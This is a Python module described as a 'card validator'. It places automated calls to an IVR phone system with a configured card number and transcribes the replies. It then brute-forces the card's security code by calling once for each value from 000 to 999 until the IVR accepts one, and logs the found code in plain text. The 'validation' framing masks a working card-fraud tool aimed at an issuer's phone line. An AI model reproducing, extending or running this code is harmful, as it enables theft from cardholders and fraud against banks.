#!/usr/bin/env python3
"""
Card Validator - Main validation logic

Handles the card validation process including card number validation
and security code verification.
"""

import asyncio
import logging
import time
from dataclasses import dataclass
from enum import Enum
from typing import Optional, Dict, Any
from pathlib import Path
import json

from config import Config
from ivr_client import IVRClient
from transcription import TranscriptionService
from response_analyzer import ResponseAnalyzer, ResponseCategory


class ValidationState(Enum):
    """States in the card validation process."""
    CARD_SUBMITTED = "card_submitted"
    AWAITING_RESPONSE = "awaiting_response"
    SECURITY_CODE_REQUIRED = "security_code_required"
    CARD_INVALID = "card_invalid"
    VERIFICATION_REQUIRED = "verification_required"
    VALIDATION_COMPLETE = "validation_complete"


@dataclass
class ValidationResult:
    """Result of card validation."""
    card_number_masked: str
    state: ValidationState
    response_category: Optional[ResponseCategory] = None
    security_code: Optional[str] = None
    security_code_valid: Optional[bool] = None
    transcript: Optional[str] = None
    matched_phrase: Optional[str] = None
    duration_seconds: float = 0.0
    timestamp: str = ""
    error: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "card_number_masked": self.card_number_masked,
            "state": self.state.value,
            "response_category": self.response_category.value if self.response_category else None,
            "security_code": self.security_code,
            "security_code_valid": self.security_code_valid,
            "transcript": (self.transcript or "")[:500],
            "matched_phrase": self.matched_phrase,
            "duration_seconds": self.duration_seconds,
            "timestamp": self.timestamp,
            "error": self.error,
        }


class CardValidator:
    """Main card validation orchestrator."""

    def __init__(self, config: Config, analyzer: ResponseAnalyzer, logger: logging.Logger):
        self.config = config
        self.analyzer = analyzer
        self.logger = logger
        self.current_code = 0
        self.valid_code = None
        self.validation_history = []

    def mask_card_number(self, card_number: str) -> str:
        """Mask card number for logging."""
        if len(card_number) <= 4:
            return "*" * len(card_number)
        return "*" * (len(card_number) - 4) + card_number[-4:]

    async def validate_card(self) -> Dict[str, Any]:
        """Main card validation process."""
        self.logger.info("Starting card validation")
        self.logger.info(f"Target IVR: {self.config.ivr_phone_number}")
        self.logger.info(f"Card: {self.mask_card_number(self.config.card_number)}")

        # Phase 1: Validate card number
        self.logger.info("Phase 1: Validating card number...")
        card_result = await self._validate_card_number()

        if card_result.state != ValidationState.SECURITY_CODE_REQUIRED:
            self.logger.error(f"Card validation failed: {card_result.state}")
            return {"success": False, "result": card_result.to_dict()}

        self.logger.info("✓ Card number valid - security code required")

        # Phase 2: Validate security codes
        self.logger.info("Phase 2: Validating security codes...")
        security_result = await self._validate_security_codes()

        return {
            "success": True,
            "card_result": card_result.to_dict(),
            "security_result": security_result.to_dict() if security_result else None,
            "valid_code": self.valid_code
        }

    async def _validate_card_number(self) -> ValidationResult:
        """Validate the card number with the IVR system."""
        masked_card = self.mask_card_number(self.config.card_number)

        try:
            # Initialize IVR client
            ivr_client = IVRClient(self.config, self.logger)

            # Make call to IVR
            await ivr_client.connect()
            call_result = await ivr_client.validate_card(self.config.card_number)
            await ivr_client.disconnect()

            # Transcribe response
            transcription_service = TranscriptionService(self.config, self.logger)
            transcript = await transcription_service.transcribe(call_result['recording_path'])

            # Analyze response
            response_category = self.analyzer.classify_card_response(transcript['transcript'])

            # Determine state
            if response_category == ResponseCategory.SECURITY_CODE_PROMPT:
                state = ValidationState.SECURITY_CODE_REQUIRED
            elif response_category == ResponseCategory.INVALID_CARD:
                state = ValidationState.CARD_INVALID
            elif response_category == ResponseCategory.VERIFICATION_REQUIRED:
                state = ValidationState.VERIFICATION_REQUIRED
            else:
                state = ValidationState.VALIDATION_COMPLETE

            result = ValidationResult(
                card_number_masked=masked_card,
                state=state,
                response_category=response_category,
                transcript=transcript['transcript'],
                duration_seconds=call_result.get('duration', 0.0),
                timestamp=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            )

            self.validation_history.append(result)
            return result

        except Exception as e:
            self.logger.error(f"Card validation error: {e}")
            return ValidationResult(
                card_number_masked=masked_card,
                state=ValidationState.VALIDATION_COMPLETE,
                error=str(e),
                timestamp=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            )

    async def _validate_security_codes(self) -> Optional[ValidationResult]:
        """Validate security codes from 000-999."""
        if self.valid_code is not None:
            self.logger.info(f"Security code already validated: {self.valid_code}")
            return None

        while self.current_code <= 999:
            if self.current_code % 10 == 0:
                self.logger.info(f"Validating security codes: {self.current_code:03d}-...")

            code_str = f"{self.current_code:03d}"
            self.current_code += 1

            try:
                # Initialize IVR client
                ivr_client = IVRClient(self.config, self.logger)

                # Make call with security code
                await ivr_client.connect()
                call_result = await ivr_client.validate_security_code(
                    self.config.card_number,
                    code_str
                )
                await ivr_client.disconnect()

                # Transcribe response
                transcription_service = TranscriptionService(self.config, self.logger)
                transcript = await transcription_service.transcribe(call_result['recording_path'])

                # Analyze response
                security_valid = self.analyzer.classify_security_code_response(transcript['transcript'])

                if security_valid:
                    self.valid_code = int(code_str)
                    self.logger.info(f"✓ VALID SECURITY CODE CONFIRMED: {code_str}")
                    result = ValidationResult(
                        card_number_masked=self.mask_card_number(self.config.card_number),
                        state=ValidationState.VALIDATION_COMPLETE,
                        security_code=code_str,
                        security_code_valid=True,
                        transcript=transcript['transcript'],
                        duration_seconds=call_result.get('duration', 0.0),
                        timestamp=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                    )
                    self.validation_history.append(result)
                    return result

                # Cooldown between attempts
                await asyncio.sleep(self.config.call_cooldown_seconds)

            except Exception as e:
                self.logger.error(f"Security code validation error for {code_str}: {e}")
                continue

        self.logger.info("No valid security code found in range 000-999")
        return None
